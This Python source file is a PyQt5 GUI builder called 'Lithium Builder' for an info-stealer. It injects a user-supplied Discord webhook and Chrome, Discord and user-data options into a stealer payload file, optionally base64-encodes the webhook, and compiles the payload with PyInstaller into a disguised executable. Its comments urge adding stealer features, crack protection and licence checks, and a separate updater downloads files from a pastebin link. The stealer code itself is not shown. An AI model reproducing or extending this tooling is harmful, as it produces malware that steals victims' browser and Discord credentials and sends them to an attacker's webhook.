import PyQt5.QtWidgets
import sys
import ctypes
import requests
import PyInstaller.__main__
import shutil
import base64
import time
from distutils.core import setup
"""
Builder Config
"""
config = {
    "webhook":"",
    "settings" : [
        {
        "chrome":"false",
        "discord":"false",
        "base64":"false",
        "userData":"false"
        }
    ]
}

 
class MyThread(PyQt5.QtCore.QThread):
    """
    Our second thread which is our progress bar.
    Only will increment when our button is clicked
    """
    change_value = PyQt5.QtCore.pyqtSignal(int)
    def run(self):
        cnt = 0
        while cnt < 100:
            cnt+=1
            time.sleep(0.30)
            self.change_value.emit(cnt)


class Window(PyQt5.QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__() 
        self.setStyleSheet("background-color: #2c2f33;") 
        self.setWindowTitle("Lithium Builder v1.0 -  By: Backslash")
        self.setFixedSize(605,150)       
        self.setWindowIcon(PyQt5.QtGui.QIcon('assets\\protection.ico')) 
        self.setWindowFlags(PyQt5.QtCore.Qt.WindowCloseButtonHint | PyQt5.QtCore.Qt.WindowMinimizeButtonHint)
        self.builderButton()

        self.threadpool = PyQt5.QtCore.QThreadPool()

        self.chrome = PyQt5.QtWidgets.QCheckBox('Chrome', self)
        self.discord = PyQt5.QtWidgets.QCheckBox('Discord ', self)

        self.base64 = PyQt5.QtWidgets.QCheckBox('Base64', self)
        self.userData = PyQt5.QtWidgets.QCheckBox('UserData', self)

        self.progressBar = PyQt5.QtWidgets.QProgressBar(self)
        self.progressBar.move(25, 125)
        self.progressBar.resize(605, 20)
        self.progressBar.setFormat("")

        self.webhookContent = PyQt5.QtWidgets.QLineEdit(self)
        self.webhookUrl()
        self.buildOptions()
        self.updateBuilder()
        self.show()

    def builderButton(self):
        """
        Our build button
        """
        button = PyQt5.QtWidgets.QPushButton('Build', self)
        button.resize(100, 35)
        button.move(25,25)
        button.setStyleSheet("background-color: #1DB954;")
        button.clicked.connect(self.on_build)
        #self.show()

    def updateBuilder(self):
        """
        Added integration for updating the builder if you wanted to get this setup
        """
        updater = PyQt5.QtWidgets.QPushButton('Update', self)
        updater.resize(100, 35)
        updater.move(25,75)
        updater.setStyleSheet("background-color: #1DB954;")
        updater.clicked.connect(self.on_update)

    def webhookUrl(self):
        """
        For setting our webhook text editor
        """  
        self.webhookContent.setStyleSheet("background-color: #fff;")
        self.webhookContent.move(150, 25)
        self.webhookContent.resize(430, 35)
        self.webhookContent.setText("PASTE YOUR WEBHOOK HERE")
        #self.webhookContent.selectAll() 

        #self.show()


    def buildOptions(self):
        """
        All of our clients build settings
        """
        self.chrome.setStyleSheet("color: #fff;")
        self.chrome.move(150,75)
        self.chrome.stateChanged.connect(self.on_settings1)

        self.discord.setStyleSheet("color: #fff;")
        self.discord.move(250,75)
        self.discord.stateChanged.connect(self.on_settings2)

        self.base64.setStyleSheet("color: #fff;")
        self.base64.move(350,75)
        self.base64.stateChanged.connect(self.on_settings3)

        self.userData.setStyleSheet("color: #fff;")
        self.userData.move(450,75)
        self.userData.stateChanged.connect(self.on_settings4)

    @PyQt5.QtCore.pyqtSlot()
    def on_build(self):
        """
        Checks to make sure we have valid settings
        """
        if "/api/webhooks" not in self.webhookContent.text():
            ctypes.windll.user32.MessageBoxW(0, "Please enter a valid webhook for Lithium Builder to work!", "Invalid Webhook", 0x0 | 0x10)
        elif config["settings"][0]["chrome"] == "false" and config["settings"][0]["discord"] == "false":
            ctypes.windll.user32.MessageBoxW(0, "Please select at least one build option!", "Invalid Build Settings", 0x0 | 0x10)
        else:
            self.thread = MyThread()
            self.thread.change_value.connect(self.setProgressVal)
            self.thread.start()

            config["webhook"] = self.webhookContent.text()
            if config["settings"][0]["base64"] == "true":
                config["webhook"] = base64.b64encode(config["webhook"].encode())
            worker = xBuilder()
            self.threadpool.start(worker)

    def setProgressVal(self, val):
        """
        Starts our progressbar thread
        """
        self.progressBar.setValue(val)
 

    def on_settings1(self, state1):
        """
        Chrome settings for builder
        """
        if state1 == PyQt5.QtCore.Qt.Checked:
            config["settings"][0]["chrome"] = "true"
        else:
            config["settings"][0]["chrome"] = "false"

    def on_settings2(self, state2):
        """
        Discord settings for builder
        """
        if state2 == PyQt5.QtCore.Qt.Checked:
            config["settings"][0]["discord"] = "true"
        else:
            config["settings"][0]["discord"] = "false"

    def on_settings3(self, state3):
        """
        Base64 settings for builder
        """
        if state3 == PyQt5.QtCore.Qt.Checked:
            config["settings"][0]["base64"] = "true"
        else:
            config["settings"][0]["base64"] = "false"

    def on_settings4(self, state4):
        """
        Userdata settings for builder
        """
        if state4 == PyQt5.QtCore.Qt.Checked:
            config["settings"][0]["userData"] = "true"
        else:
            config["settings"][0]["userData"] = "false"

        
    def on_update(self):
        """
        Checks if there is an update needed
        """     
        worker = xUpdater()
        self.threadpool.start(worker)


#https://pastebin.com/raw/Bkg5CuF7 demo pastebin

class xUpdater(PyQt5.QtCore.QRunnable):
    """
    Checks if any updates are needed:
        - If your a dev change out your pastebin link with whatever your api is, ive tried making it nice json data for easy checks.
    """
    def __init__(self):
        super(xUpdater, self).__init__()
        self.threadpool = PyQt5.QtCore.QThreadPool()

    @PyQt5.QtCore.pyqtSlot()
    def run(self):
        try:
            r = requests.get("https://pastebin.com/raw/Bkg5CuF7").json()
            if r["version"] == "1.0":
                ctypes.windll.user32.MessageBoxW(0, "No new updates required!", "Fully Updated", 0x0 | 0x40)
            else:
                n = requests.get(r["redirect"])
                f = open("Update.zip","w+",encoding="utf-8")
                f.write(n.text)
                ctypes.windll.user32.MessageBoxW(0, f"Successfully Update Lithium Loder to Version: {r['version']}!", "Success", 0x0 | 0x40)
        except:
            pass

class xBuilder(PyQt5.QtCore.QRunnable):
    """
    Full builder settings:
        [How it works]
            - Writes to our file with our new settings.
            - Builds our file using pyinstaller

        [Suggestions]
            - Fix the ui colors, they hurt my eyes
            - Dont use ctypes, this was my first ever pyqt5 project, create a new window and have it act like a popup
            - Add more features to the stealer, check stealer.py for more
            - Crack protection
            - Auth button, super straight forward actually, I would do key|hwid based your choice however

    """
    def __init__(self):
        super(xBuilder, self).__init__()
        self.threadpool = PyQt5.QtCore.QThreadPool()

    @PyQt5.QtCore.pyqtSlot()
    def run(self):
        try:
            with open("assets\\stealer.bin", "r") as f:
                lines = f.readlines()
            with open("assets\\stealer.bin", "w") as f:
                for line in lines:
                    if "config = " not in line.strip("\n"):
                        f.write(line)
            self.insert("assets\\stealer.bin", f"config = {config}")
            PyInstaller.__main__.run(['assets\\stealer.bin', '-n build.exe','--windowed' ,'--onefile','--clean', '--icon=assets\\protection.ico'])
            shutil.rmtree('build')
            f.close()
            ctypes.windll.user32.MessageBoxW(0, "Please check your dist folder, finished building Lithium Client!", "Finished", 0x0 | 0x40)

        except Exception as e:
            ctypes.windll.user32.MessageBoxW(0, f"An Error Occured: {e}", "ERROR", 0x0 | 0x10)

    def insert(self, filename, line):
        with open(filename, 'r+',encoding="utf-8") as f:
            content = f.read()
            f.seek(0, 0)
            f.write(line.rstrip('\r\n') + '\n' + content)

if __name__ == "__main__":
    app = PyQt5.QtWidgets.QApplication(sys.argv) 
    window = Window() 
    sys.exit(app.exec()) 
